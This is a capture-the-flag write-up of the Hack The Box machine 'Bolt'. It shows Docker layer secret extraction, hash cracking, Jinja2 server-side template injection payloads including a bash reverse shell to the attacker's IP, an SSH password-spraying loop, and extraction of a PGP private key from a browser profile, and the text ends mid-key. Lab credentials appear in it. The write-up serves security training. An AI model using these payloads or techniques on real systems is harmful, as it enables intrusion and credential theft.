---
title: HTB: Bolt
url: https://0xdf.gitlab.io/2022/02/19/htb-bolt.html
date: 2022-02-19T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-bolt, youtube, nmap, vhosts, wfuzz, ffuf, docker, docker-tar, feroxbuster, roundcube, webmail, passbolt, dive, sqlite, hashcat, source-code, ssti, payloadsallthethings, password-reuse, password-reset, credentials, chrome, john, python
---

![Bolt](https://0xdfimages.gitlab.io/img/bolt-cover.png)

Bolt was all about exploiting various websites with different bits of information collected along the way. To start, I’ll download a Docker image from the website, and pull various secrets from the older layers of the image, including a SQLite database and the source to the demo website. With that, I’m able to get into the demo website and exploit a server-side template injection vulnerability to get a foothold on the box. After some password reuse to get to the next user, I’ll go into the user’s Chrome profile to pull out the PGP key associated with their Passbolt password manager account, and use it along with database access to reset the users password and get access to their passwords, including the root password. In Beyond Root, a deep dive into the SSTI payloads used on this box.

## Box Info

| Name | [Bolt](https://hackthebox.com/machines/bolt)  [Bolt](https://hackthebox.com/machines/bolt) [Play on HackTheBox](https://hackthebox.com/machines/bolt) |
| --- | --- |
| Release Date | [25 Sep 2021](https://twitter.com/hackthebox_eu/status/1440678932018176010) |
| Retire Date | 19 Feb 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bolt |
| Radar Graph | Radar chart for Bolt |
| First Blood User | 00:34:28[dmw0ng dmw0ng](https://app.hackthebox.com/users/610173) |
| First Blood Root | 01:09:33[dmw0ng dmw0ng](https://app.hackthebox.com/users/610173) |
| Creators | [d4rkpayl0ad d4rkpayl0ad](https://app.hackthebox.com/users/168546)  [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.114
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 13:23 EDT
Warning: 10.10.11.114 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.114
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 98.13 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.114
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 13:25 EDT
Nmap scan report for 10.10.11.114
Host is up (0.089s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://passbolt.bolt.htb/auth/login
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.87 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

The TLS certificate provides a domain, as well as in the redirect that comes back on 443 to `passbolt.bolt.htb`. I’ll add that and bolt.htb to my `/etc/hosts` file.

### VHosts

#### HTTP

Given the use of virtual hosts, I’ll use `wfuzz` to scan for more. I’ll start it without a filter, and notice that the standard response is 30341 characters log, and then kill it and run again with `--hh 30341` to hide those:

```

oxdf@hacky$ wfuzz -u http://10.10.11.114 -H "Host: FUZZ.bolt.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 30341
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.114/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000000038:   302        3 L      24 W       219 Ch      "demo"
000000002:   200        98 L     322 W      4943 Ch     "mail"

Total time: 202.6766
Processed Requests: 19966
Filtered Requests: 19964
Requests/sec.: 98.51157

```

It found two more that I’ll add to `/etc/hosts`.

#### HTTPS

For the HTTPS, everything returns a 302 redirect to https://passbolt.bolt.htb. To filter that out, I switched to `ffuf`, with the `--fr passbolt` option to filter content containing a given regex:

```

oxdf@hacky$ ffuf -u https://10.10.11.114 -H "Host: FUZZ.bolt.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fr passbolt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.114
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.bolt.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: passbolt
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 56 req/sec :: Duration: [0:06:06] :: Errors: 0 ::

```

The idea is to filter for any redirects to something else or any response that doesn’t contain “passbolt”. It didn’t find anything useful, but it’s good to know how to use `ffuf` to do that kind of filtering.

### bolt.htb - TCP 80

#### Site

Visiting by IP or bolt.htb returns this site for a web design company:

[![image-20210908134825281](https://0xdfimages.gitlab.io/img/image-20210908134825281.png)](https://0xdfimages.gitlab.io/img/image-20210908134825281.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210908134825281.png)

There’s a handful of pages, including contact, services, pricing. There’s a lot to look at here, but I’ll focus on two.

The link to download gives a page that offers a Docker image:

[![image-20210908135208079](https://0xdfimages.gitlab.io/img/image-20210908135208079.png)](https://0xdfimages.gitlab.io/img/image-20210908135208079.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210908135208079.png)

The button returns `image.tar`, which I’ll examine in a moment.

The Login button on the top right leads to `/login`:

![](https://0xdfimages.gitlab.io/img/image-20210908135259081.png)

The “Create Account” link leads to another form, but on submitting it fails:

![image-20210908140106137](https://0xdfimages.gitlab.io/img/image-20210908140106137.png)

#### Tech Stack

The main page loads as `index.html`, which doesn’t give too much information about the hosting.

The response headers show NGINX, but not much more there either.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything additional that’s useful beyond what I already know:

```

oxdf@hacky$ feroxbuster -u http://bolt.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bolt.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      199l      639w    11038c http://bolt.htb/register
302        4l       24w      209c http://bolt.htb/logout
200      468l     1458w    26293c http://bolt.htb/contact
200      346l     1141w    18570c http://bolt.htb/download
308        4l       24w      239c http://bolt.htb/index
200      405l     1419w    22443c http://bolt.htb/services
200      173l      564w     9287c http://bolt.htb/login
200      549l     2014w    31731c http://bolt.htb/pricing
200      199l      639w    11038c http://bolt.htb/sign-up
200      173l      564w     9287c http://bolt.htb/sign-in
200      147l      480w     7331c http://bolt.htb/check-email

```

### demo.bolt.htb - TCP 80

This page redirects to `/login`, and presents a very similar form to the other login:

![image-20210908141950450](https://0xdfimages.gitlab.io/img/image-20210908141950450.png)

It is slightly different. For example, it has a “Remember me” checkbox.

The “Create account” link leads to another form:

![image-20210908142101903](https://0xdfimages.gitlab.io/img/image-20210908142101903.png)

This one requires an invite code. Trying to register and just guess a code returns an error:

![image-20210908142051390](https://0xdfimages.gitlab.io/img/image-20210908142051390.png)

I’ll run `feroxbuster` and look at the requests, but no new information there either.

### mail.bolt.htb - TCP 80

This page loads another login form:

![image-20210908142237548](https://0xdfimages.gitlab.io/img/image-20210908142237548.png)

A quick check of the page source shows this is an instance of Roundcube. I’m not able to log in, SQL inject, or find anything else useful. A quick search for public exploits against Roundcube comes up empty as well.

### passbolt.bolt.htb - TCP 443

Visiting HTTPS by IP just redirects to this subdomain. It also presents a login screen to a passbolt instance:

![image-20210908142456124](https://0xdfimages.gitlab.io/img/image-20210908142456124.png)

[passbolt](https://www.passbolt.com/) is an open source self-hosted Open-PGP-based password manager. Some Googling for passbolt exploits didn’t turn up much, but searching for “pentesting passbolt” did return a whitepaper that I’ll come back to later.

Entering 0xdf@bolt.htb returns an error:

![image-20210908142554058](https://0xdfimages.gitlab.io/img/image-20210908142554058.png)

I’ll try some others (like admin@bolt.htb), but nothing different.

### image.tar

#### Structure

Listing the files in the archive shows a bunch of folders with hash names each containing a `VERSION`, a `json`, and a `layer.tar`, as well as `manifest.json` and `repositories` files:

```

oxdf@hacky$ tar tf image.tar           
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/    
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/VERSION  
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/json
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/    
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/VERSION  
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/json
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar
...[snip...                                                     
manifest.json                        
repositories 

```

I’ve run into this before in [Hacvent 2020](/hackvent2020/leet#solution) and [Flare-On 2021](/flare-on-2021/antioch). But if I hadn’t, Googling “layer.tar” returns a bunch of links about Docker images and unpacking them:

![image-20210908144511283](https://0xdfimages.gitlab.io/img/image-20210908144511283.png)

#### Explore

In each of those directories named for hashes are the layers of the Docker image, including previous iterations for the container. A really neat tool for pulling secrets from a Docker image is [dive](https://github.com/wagoodman/dive). I’ll follow the install instructions from the readme (though I used `dpkg -i [.deb]` rather than `apt install`). Now I can run it on my image with `dive docker-archive://image.tar`, and it loads an interactive screen:

[![image-20220219080216647](https://0xdfimages.gitlab.io/img/image-20220219080216647.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080216647.png)

On the top left, there’s a list of what changes for layer to layer, with the oldest layer at the top. By hitting tab to move into the contents, and then Ctrl-F to filter, and Ctrl-U to unselect Unmodified, it will then show me only the files that were modified, added, or removed with this layer:

[![image-20210908145636963](https://0xdfimages.gitlab.io/img/image-20210908145636963.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210908145636963.png)

There’s a `sqlite.db` that’s included at an early layer but no longer there (it’s in red):

[![image-20220219080404612](https://0xdfimages.gitlab.io/img/image-20220219080404612.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080404612.png)

In the previous layer, it shows as present:

[![image-20220219080425474](https://0xdfimages.gitlab.io/img/image-20220219080425474.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080425474.png)

I’ll grab that layer ID and pull that from the archive:

```

oxdf@hacky$ tar xvf image.tar a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar 
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar
oxdf@hacky$ tar tf a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar 
db.sqlite3
root/
root/.ash_history
tmp/

```

It has a `.ash_history` file, and a `db.sqlite`. The `.ash_history` file just contains the `exit` command.

The other thing that I noticed looking through the history was the changing of the website files. In the first layer, there’s no files beyond the standard file system stuff. Then they add the basics for a flask site:

[![image-20220219080518622](https://0xdfimages.gitlab.io/img/image-20220219080518622.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080518622.png)

The third layer adds to the app:

[![image-20220219080553378](https://0xdfimages.gitlab.io/img/image-20220219080553378.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080553378.png)

The next two layer involve installing Python and modules, so nothing interesting.

The next four layers involve `gunicorn` which is what starts a Flask app. The database is added in there. In the forth one, a bunch of the code site files and the db are deleted (shown in red):

[![image-20220219080636006](https://0xdfimages.gitlab.io/img/image-20220219080636006.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080636006.png)

In the next one, they come back, but each of different size:

[![image-20220219080659075](https://0xdfimages.gitlab.io/img/image-20220219080659075.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220219080659075.png)

I’ll want to check those out. I believe the idea here is that they made a Docker image for public use, but perhaps they updated a previous existing private image to get there, in which case, there could be interesting stuff in those older layers.

#### SQLite DB

Opening the DB with `sqlite3`, there’s a single table:

```

oxdf@hacky$ sqlite3 db.sqlite3 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .table
User

```

It has columns you’d expect in a User table:

```

sqlite> .schema User
CREATE TABLE IF NOT EXISTS "User" (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        password BLOB, 
        email_confirmed BOOLEAN, 
        profile_update VARCHAR(80), 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);

```

There’s a single row:

```

sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||

```

#### Crack Hash

The format matches md5crypt in the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. Running it in `hashcat` breaks almost instantly:

```

$ hashcat -m 500 admin.hash /usr/share/wordlists/rockyou.txt
...[snip]...
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt      
...[snip]...

```

#### Flask App

The files that were there but then replaces with new versions were `forms.py`, `routes.py`, and `register.html`. They were first added in layer 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad. I’ll pull that layer out:

```

oxdf@hacky$ tar xf image.tar 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar

```

Listing the files in that archive, there are a ton. I’ll use `grep` to get the Python files:

```

oxdf@hacky$ tar tf 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar  | grep py$
app/__init__.py
app/base/__init__.py
app/base/forms.py
app/base/models.py
app/base/routes.py
app/base/util.py
app/home/__init__.py
app/home/forms.py
app/home/routes.py

```

I can extract the Python files with:

```

oxdf@hacky$ tar xf layer.tar --wildcards '*.py'
oxdf@hacky$ find app/ -type f
app/home/forms.py
app/home/__init__.py
app/home/routes.py
app/base/util.py
app/base/models.py
app/base/forms.py
app/base/__init__.py
app/base/routes.py
app/__init__.py

```

In `app/base/routes.py` is what looks like the source for the demo site:

```

@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html',
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html',
                                    msg='Email already registered',
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html',
                                msg='User created please <a href="/login">login</a>',
                                success=True,
                                form=create_account_form)
...[snip]...

```

There’s one more part in that same file that jumps out at me - at the top `app/home/routes.py`, it imports `render_template_string`. This is a dangerous function if user input is passed to it as it will lead to a server-side template injection (SSTI) where user input is handled as code. It’s used in `/confirm/changes/<token>`:

```

@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')

```

It’s using the input to build an HTML response, and it’s passing in the name to `render_template_string`. If I can update an account username, it could be vulnerable to SSTI. And if I can receive that email, it wouldn’t be blind.

## Shell as www-data

### Website Access

#### Main Site

The password “deadbolt” (from the DB in the Docker image), works to log into the main site:

[![image-20220218064213310](https://0xdfimages.gitlab.io/img/image-20220218064213310.png)](https://0xdfimages.gitlab.io/img/image-20220218064213310.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220218064213310.png)

It’s a busy dashboard, with a lot of chaff. There’s a chat section with two employees talking about security risks in the Docker image, and making sure to scrub it before releasing it (oops).

#### demo

The source code from the Docker image showed it was checking for a key of “XNSS-HSJW-3NGU-8XTJ”. I’ll try that at `demo.bolt.htb/register`:

![image-20220218095022269](https://0xdfimages.gitlab.io/img/image-20220218095022269.png)

It works:

[![image-20220218095317032](https://0xdfimages.gitlab.io/img/image-20220218095317032.png)](https://0xdfimages.gitlab.io/img/image-20220218095317032.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220218095317032.png)

This page is also full of uninteresting stuff, much of it not implemented or functioning. There is a panel at the top right that shows the account settings:

![image-20220218100330991](https://0xdfimages.gitlab.io/img/image-20220218100330991.png)

This looks like where I could try the SSTI in the username.

#### mail

The account I created for `demo.bolt.htb` also works to log into `mail.bolt.htb`. It presents an empty inbox:

![image-20220218101356246](https://0xdfimages.gitlab.io/img/image-20220218101356246.png)

### SSTI

#### POC

With access to both the demo site and mail, I can try the SSTI. From `/admin/profile` page, in the settings tab (shown above), “Name” is what is potentially vulnerable to SSTI, so I’ll update it to `{{ 7*7 }}`. If this is SSTI, it will display 49.

On hitting submit, there’s an email in RoundCube:

![image-20210908163231358](https://0xdfimages.gitlab.io/img/image-20210908163231358.png)

Once I click confirm, another email arrives:

![image-20210908163221617](https://0xdfimages.gitlab.io/img/image-20210908163221617.png)

It addresses me as 49, so the SSTI worked.

#### Execution POC

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) has a good page for SSTI. I’ll use the Jinja2 section since that’s what Flask uses.

When I solved the box originally, I used a less reliable version of a SSTI payload, and I’ve learned of a few better ones since then. In [Beyond Root](#beyond-root), I’ll dive into the different payloads and how I got the more difficult one working for Bolt, as well as look at what they are doing.

For now, I’ll grab a payload like:

```

{{ namespace.__init__.__globals__.os.popen('id').read() }}

```

If I set my name to that and submit, in the second email I see:

![image-20220218153059513](https://0xdfimages.gitlab.io/img/image-20220218153059513.png)

#### Shell

I am also able to `ping -c 1 10.10.14.6` and see ICMP packets in `tcpdump`, and the results is in the email:

![image-20210908165753130](https://0xdfimages.gitlab.io/img/image-20210908165753130.png)

I’ll go for a reverse shell:

```

{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}

```

It connects:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.114] 57570
bash: cannot set terminal process group (968): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$ 

```

I’ll do the terminal trick with `script` to upgrade my shell:

```

www-data@bolt:~/demo$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@bolt:~/demo$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@bolt:~/demo$

```

## Shell as eddie

### Enumeration

#### Home Directories

There are two users with homedirs on the system, and www-data can’t access either:

```

www-data@bolt:/home$ ls -l
total 8
drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark
drwxr-x--- 16 eddie eddie 4096 Aug 26 23:55 eddie
www-data@bolt:/home$ cd clark
bash: cd: clark: Permission denied
www-data@bolt:/home$ cd eddie
bash: cd: eddie: Permission denied

```

#### DBs

A common place to check for creds is in the various config files for the webservers. There are four identified servers here. The first three are easy to find. passbolt required some poking around at NGINX configs in `/etc/nginx/sites-enabled`:

| Server | Web Root | config file | Password(s) |
| --- | --- | --- | --- |
| bolt.htb | `/var/www/dev` | `config.py` | dXUUHSW9vBpH5qRB kreepandcybergeek |
| demo.bolt.htb | `/var/www/demo` | `config.py` | dXUUHSW9vBpH5qRB kreepandcybergeek |
| RoundCube | `/var/www/roundcube` | `config/config.inc.php` | WXg5He2wHt4QYHuyGET |
| passbolt | `/etc/passbolt`\* | `passbolt.php` | rT2;jW7<eY8!dX8}pQ8% |

\*The actual webroot is `/usr/share/php/passbolt/webroot`, but `/etc/passbolt` is also included, and it has the config file.

### su / SSH

I tried a bunch of these passwords with both eddie and clark, and the combination of eddie / rT2;jW7<eY8!dX8}pQ8% worked:

```

www-data@bolt:/etc/nginx/sites-enabled$ su - eddie
Password: 
eddie@bolt:~$

```

I could also do this in a loop over SSH:

```

for u in clark eddie; do 
  for p in $(cat passwords); do 
    sshpass -p "$p" ssh ${u}@10.10.11.114 -f 'exit' && 
    echo "Success! User: $u Pass: $p"; 
  done; 
done

```

This will get each combination of user and password, and try to SSH to Bolt. The session is running exit immediately after a successful connection, so if that happens, it will exit successfully and print the message. It finds a working set of creds:

```

oxdf@hacky$ for u in clark eddie; do for p in $(cat passwords); do sshpass -p "$p" ssh ${u}@10.10.11.114 -f 'exit' && echo "Success! User: $u Pass: $p"; done; done
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Success! User: eddie Pass: rT2;jW7<eY8!dX8}pQ8%

```

Either way, I can get `user.txt`:

```

eddie@bolt:~$ cat user.txt
8403ba4b************************

```

## Shell as root

### Enumeration

#### Mail

`/var/mail` has mailboxes for different users on the system:

```

eddie@bolt:/var/mail$ ls -l
total 16
drwx--S--- 5     5001 mail 4096 Sep  8 14:59 0xdf
-rw------- 1 eddie    mail  909 Feb 25  2021 eddie
-rw------- 1 root     mail    1 Mar  3  2021 root
-rw------- 1 www-data mail    1 Mar  3  2021 www-data

```

I suspect mine has the emails from the SSTI earlier (though I can’t access it as eddie). eddie’s has an email from clark:

```

From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...
-Clark

```

This is a clear reference to passbolt, and the [whitepaper](https://help.passbolt.com/assets/files/Security%20White%20Paper%20-%20passbolt%20Pro%20Edition.pdf) I found earlier. It’s a pretty clear signal that that is the place to target.

#### Whitepaper

In the table of contents for the whitepaper, “Compromised Client” stands out to me as relevant here:

![image-20210908174457322](https://0xdfimages.gitlab.io/img/image-20210908174457322.png)

Page 40 says that passbolt doesn’t protect against an attacker having access to the local filesystem:

![image-20210908174719849](https://0xdfimages.gitlab.io/img/image-20210908174719849.png)

On page 21, it says that the private key is stored in the web extension local storage:

![image-20210908174624408](https://0xdfimages.gitlab.io/img/image-20210908174624408.png)

#### Get Key

Besides the flag, there aren’t many user files in `/home/eddie`. There are a fair number of hidden directories:

```

eddie@bolt:~$ ls -la
total 80
drwxr-x--- 16 eddie eddie 4096 Aug 26 23:55 .
drwxr-xr-x  4 root  root  4096 Mar  3  2021 ..
lrwxrwxrwx  1 eddie eddie    9 Feb 24  2021 .bash_history -> /dev/null
-rw-r--r--  1 eddie eddie  220 Feb 24  2021 .bash_logout
-rw-r--r--  1 eddie eddie 3771 Feb 24  2021 .bashrc
drwx------ 13 eddie eddie 4096 Aug 26 23:54 .cache
drwxr-xr-x 14 eddie eddie 4096 Feb 25  2021 .config
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Desktop
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Documents
drwxr-xr-x  2 eddie eddie 4096 Feb 25  2021 Downloads
drwx------  3 eddie eddie 4096 Feb 25  2021 .gnupg
drwxr-xr-x  3 eddie eddie 4096 Aug  4 13:06 .local
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Music
lrwxrwxrwx  1 eddie eddie    9 Feb 25  2021 .mysql_history -> /dev/null
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Pictures
drwx------  3 eddie eddie 4096 Feb 25  2021 .pki
-rw-r--r--  1 eddie eddie  807 Feb 24  2021 .profile
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Public
drwx------  2 eddie eddie 4096 Feb 25  2021 .ssh
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Templates
-r--------  1 eddie eddie   33 Feb 25  2021 user.txt
drwxr-xr-x  2 eddie eddie 4096 Feb 24  2021 Videos

```

`.ssh` is empty. `.config` is a place where program store their configurations:

```

eddie@bolt:~$ ls .config/
dconf                     gnome-session  mimeapps.list    user-dirs.dirs
enchant                   goa-1.0        monitors.xml     user-dirs.locale
evolution                 google-chrome  nautilus
gedit                     gtk-3.0        pulse
gnome-initial-setup-done  ibus           update-notifier

```

`google-chrome` jumps out as interesting. `Default` is the name of a profile:

```

eddie@bolt:~/.config/google-chrome$ ls
 AutofillStates          Dictionaries      'Last Version'              pnacl                            SSLErrorAssistant
 BrowserMetrics          FileTypePolicies  'Local State'              'Safe Browsing'                  'Subresource Filter'
 CertificateRevocation  'First Run'         MEIPreload                'Safe Browsing Cookies'           TLSDeprecationConfig
'Crash Reports'          Floc               NativeMessagingHosts      'Safe Browsing Cookies-journal'  'Webstore Downloads'
'Crowd Deny'             GrShaderCache      OnDeviceHeadSuggestModel   SafetyTips                       WidevineCdm
 Default                 hyphen-data        OriginTrials               ShaderCache                      ZxcvbnData

```

In `Default/Extensions`, there are three folders:

```

eddie@bolt:~/.config/google-chrome/Default/Extensions$ ls
didegimhafipceonhjepacocaffmoppf  nmmhkkegccagdldgiimedpiccmgmieda  pkedcjkdefgpdelpbcmbmeomcjbeemfm

```

Each has a folder with a version number. To find if any are passbolt, a simple `grep`, and then `cut` to get just the top folder, and a `sort -u` to just see each unique folder:

```

eddie@bolt:~/.config/google-chrome/Default/Extensions$ grep -ir passbolt | cut -d'/' -f1 | sort -u
didegimhafipceonhjepacocaffmoppf

```

It seems that `didegimhafipceonhjepacocaffmoppf` is passbolt, but the key isn’t in this folder. `Local Extension Settings` has the same folder:

```

eddie@bolt:~/.config/google-chrome/Default$ ls Local\ Extension\ Settings/
didegimhafipceonhjepacocaffmoppf

```

And it seems there could be a private key in `000003.log`:

```

eddie@bolt:~/.config/google-chrome/Default$ grep -r PRIVATE Local\ Extension\ Settings/didegimhafipceonhjepacocaffmoppf/
Binary file Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches

```

Running `strings` into `grep` returns a bunch of text, but I can cut out a private key:

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
